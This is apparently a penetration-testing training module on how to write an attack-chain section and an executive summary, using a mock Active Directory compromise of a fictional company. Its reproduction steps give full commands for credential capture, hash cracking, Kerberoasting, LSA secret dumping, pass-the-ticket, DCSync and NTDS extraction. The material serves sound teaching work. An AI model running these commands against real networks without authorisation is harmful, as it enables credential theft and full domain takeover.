## Writing an Attack Chain

The attack chain is our chance to show off the cool exploitation chain we took to gain a foothold, move laterally, and compromise the domain. It can be a helpful mechanism to help the reader connect the dots when multiple findings are used in conjunction with each other and gain a better understanding of why certain findings are given the severity rating that they are assigned. For example, a particular finding on its own may be `medium-risk` but, combined with one or two other issues, could elevate it to `high-risk`, and this section is our chance to demonstrate that. A common example is using `Responder` to intercept NBT-NS/LLMNR traffic and relaying it to hosts where SMB signing is not present. It can get really interesting if some findings can be incorporated that might otherwise seem inconsequential, like using an information disclosure of some sort to help guide you through an LFI to read an interesting configuration file, log in to an external-facing application, and leverage functionality to gain remote code execution and a foothold inside the internal network.

There are multiple ways to present this, and your style may differ but let's walk through an example. We will start with a summary of the attack chain and then walk through each step along with supporting command output and screenshots to show the attack chain as clearly as possible. A bonus here is that we can re-use this as evidence for our individual findings so we don't have to format things twice and can copy/paste them into the relevant finding.

Let's get started. Here we'll assume that we were contracted to perform an Internal Penetration Test against the company `Inlanefreight` with either a VM inside the client's infrastructure or in their office on our laptop plugged into an ethernet port. For our purposes, this mock assessment was performed from a `non-evasive` standpoint with a `grey box` approach, meaning that the client was not actively attempting to interfere with testing and only provided in-scope network ranges and nothing more. We were able to compromise the internal domain `INLANEFREIGHT.LOCAL` during our assessment.

Note: A copy of this attack chain can also be found in the attached sample report document.
## Sample Attack Chain - INLANEFREIGHT.LOCAL Internal Penetration Test

1. The tester utilized the [Responder](https://github.com/lgandx/Responder) tool to obtain an NTLMv2 password hash for a domain user, `bsmith`.
2. This password hash was successfully cracked offline using the [Hashcat](https://github.com/hashcat/hashcat) tool to reveal the user's cleartext password, which granted a foothold into the `INLANEFREIGHT.LOCAL` domain, but with no more privileges than a standard domain user.
3. The tester then ran the [BloodHound.py](https://github.com/fox-it/BloodHound.py) tool, a Python version of the popular [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using `Hashcat` if a weak password is set. From here, the tester used the [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) tool to carry out a targeted Kerberoasting attack against the `mssqlsvc` account, having found that the `mssqlsvc` account had local administrator rights over the host `SQL01.INLANEFREIGHT.LOCAL` which was an interesting target in the domain.
4. The tester successfully cracked this account's password offline, revealing the cleartext value.
5. The tester authenticated to the host `SQL01.INLANEFREIGHT.LOCAL` and retrieved a cleartext password from the host's registry by decrypting LSA secrets for an account (`srvadmin`), which was set up for autologon.
6. This `srvadmin` account had local administrator rights over all servers (aside from Domain Controllers) in the domain, so the tester logged into the `MS01.INLANEFREIGHT.LOCAL` host and retrieved a Kerberos TGT ticket for a logged-in user, `pramirez`. This user was part of the `Tier I Server Admins` group, which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket.
7. The tester used the [Rubeus](https://github.com/GhostPack/Rubeus) tool to extract the Kerberos TGT ticket for the `pramirez` user and perform a Pass-the-Ticket attack to authenticate as this user.
8. Finally, the tester performed a DCSync attack after successfully authenticating with this user account via the [Mimikatz](https://github.com/gentilkiwi/mimikatz) tool, which ended in domain compromise.
#### Detailed reproduction steps for this attack chain are as follows:
#### Responder

```shell
3kjS@htb[/htb]$ sudo responder -I eth0 -wrfv
```
#### Hashcat

```shell
3kjS@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt
```
#### GetUserSPNs

```shell
3kjS@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204
```
#### Bloodhound

```shell
3kjS@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All
```
![](Components%20of%20a%20Report-20260829-132813.png)
The tester then performed a targeted Kerberoasting attack to retrieve the Kerberos TGS ticket for the `mssqlsvc` service account.
#### GetUserSPNs

```shell
3kjS@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
```
#### Hashcat

```shell
3kjS@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt
```
#### CrackMapExec

```shell
3kjS@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
```
#### Logged In Users

```cmd
C:\htb> query user

 USERNAME         SESSIONNAME  ID  STATE   IDLE TIME  LOGON TIME
 pramirez          rdp-tcp     2   Active          3  5/14/20228:21 AM
>srvadmin          rdp-tcp#2   3   Active          .  5/14/2022 8:24 AM
```
![](Components%20of%20a%20Report-20260829-133101.png)
#### Rubeus

```powershell
PS C:\htb> .\Rubeus.exe triage
```

The tester then used this tool to retrieve the Kerberos TGT ticket for this user, which can then be used to perform a "pass-the-ticket" attack and use the stolen TGT ticket to access resources in the domain.

```powershell
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
```

```powershell
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```
#### Cached Kerberos Tickets

```powershell
PS C:\htb> klist
```

The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the built-in Administrator account, which led to Enterprise Admin level access over the domain.
#### Mimikatz

```powershell
PS C:\htb> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
```
![](Screenshot%202026-08-29%20at%2014.04.13.png)
#### CrackMapExec

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```
#### Dumping NTDS with SecretsDump

```shell
3kjS@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
```
## Example Executive Summary

Below is a sample executive summary that was taken from the sample report included with this module:

During the internal penetration test against Inlanefreight, Hack The Box Academy identified seven (7) findings that threaten the confidentiality, integrity, and availability of Inlanefreight’s information systems. The findings were categorized by severity level, with five (5) of the findings being assigned a high-risk rating, one (1) medium-risk, and one (1) low risk. There was also one (1) informational finding related to enhancing security monitoring capabilities within the internal network.

The tester found Inlanefreight’s patch and vulnerability management to be well-maintained. None of the findings in this report were related to missing operating system or third-party patches of known vulnerabilities in services and applications that could result in unauthorized access and system compromise. Each flaw discovered during testing was related to a misconfiguration or lack of hardening, with most falling under the categories of weak authentication and weak authorization.

One finding involved a network communication protocol that can be “spoofed” to retrieve passwords for internal users that can be used to gain unauthorized access if an attacker can gain unauthorized access to the network without credentials. In most corporate environments, this protocol is unnecessary and can be disabled. It is enabled by default primarily for small and medium-sized businesses that do not have the resources for a dedicated hostname resolution (the “phonebook” of your network) server. During the assessment, these resources were observed on the network, so Inlanefreight should begin formulating a test plan to disable the dangerous service.

The next issue was a weak configuration involving service accounts that allows any authenticated user to steal a component of the authentication process that can often be guessed offline (via password “cracking”) to reveal the human-readable form of the account’s password. These types of service accounts typically have more privileges than a standard user, so obtaining one of their passwords in clear text could result in lateral movement or privilege escalation and eventually in complete internal network compromise. The tester also noticed that the same password was used for administrator access to all servers within the internal network. This means that if one server is compromised, an attacker can re-use this password to access any server that shares it for administrative access. Fortunately, both of these issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users.

A webserver was also found to be running a web application that used weak and easily guessable credentials to access an administrative console that can be leveraged to gain unauthorized access to the underlying server. This could be exploited by an attacker on the internal network without needing a valid user account. This attack is very well-documented, so it is an exceedingly likely target that can be particularly damaging, even in the hands of an unskilled attacker. Ideally, direct external access to this service would be disabled, but in the event that it cannot be, it should be reconfigured with exceptionally strong credentials that are rotated frequently. Inlanefreight may also want to consider maximizing the log data collected from this device to ensure that attacks against it can be detected and triaged quickly.

The tester also found shared folders with excessive permissions, meaning that all users in the internal network can access a considerable amount of data. While sharing files internally between departments and users is important to day-to-day business operations, wide-open permissions on file shares may result in unintentional disclosure of confidential information. Even if a file share does not contain any sensitive information today, someone may unwittingly put such data there, thinking it is protected when it isn’t. This configuration should be changed to ensure that users can access only what is necessary to perform their day-to-day duties.

Finally, the tester noticed that testing activities seemed to go mostly unnoticed, which may represent an opportunity to improve visibility into the internal network and indicates that a real-world attacker might remain undetected if internal access is achieved. Inlanefreight should create a remediation plan based on the Remediation Summary section of this report, addressing all high findings as soon as possible according to the needs of the business. Inlanefreight should also consider performing periodic vulnerability assessments if they are not already being performed. Once the issues identified in this report have been addressed, a more collaborative, in-depth Active Directory security assessment may help identify additional opportunities to harden the Active Directory environment, making it more difficult for attackers to move around the network and increasing the likelihood that Inlanefreight will be able to detect and respond to suspicious activity.
